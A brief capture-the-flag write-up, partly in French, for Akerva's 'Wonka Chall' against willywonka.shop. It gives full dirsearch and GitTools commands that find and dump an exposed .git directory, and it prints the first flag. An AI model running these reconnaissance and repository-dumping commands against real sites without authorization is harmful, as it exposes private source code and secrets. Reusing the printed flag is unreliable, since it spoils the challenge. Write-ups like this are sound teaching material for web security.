# Wonka Chall

> Akerva

> https://willywonka.shop

## Step 1

1. dirsearch -> .git
2. GitTools -> dumper -> extractor
3. Flag 1 dans .git/COMMIT_EDITMSG

> 16ECD0DF90036C3CA8D6E988BB1737DC332CD72A8F4E62C32E0F825EDD155009

More detail: ['Step1'](./step1.md)

## Step 2



## Resources

1. GitTools : https://github.com/internetwache/GitTools.git

---

## Useful command used

* dirsearch

```bash
python3 /opt/t/pentest/recona/dirsearch/dirsearch.py -u https://willywonka.shop/ -e do,java,action,db,sql,~,xml,pdf,jsp,php,old,bak,zip,tar,asp,aspx,txt,html,xsl,xslx -t 25
```

* gittools

```bash
/opt/t/pentest/exploit/GitTools/Dumper/gitdumper.sh https://willywonka.shop/.git/ git_out
/opt/t/pentest/exploit/GitTools/Extractor/extractor.sh git_out git_extract
```